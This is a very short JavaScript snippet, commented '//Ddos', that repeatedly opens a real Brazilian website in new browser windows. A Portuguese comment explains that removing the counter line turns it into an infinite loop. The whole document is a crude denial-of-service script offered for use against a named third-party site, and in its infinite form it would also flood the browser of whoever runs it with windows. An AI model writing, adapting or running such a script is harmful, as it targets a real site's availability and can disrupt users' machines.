	//Ddos
	var a = 1;	
	while(a < 10)
	{
		window.open("http://www.norton.net.br");
		a++; //comentar esta linha para ficar looping infinito		
	}
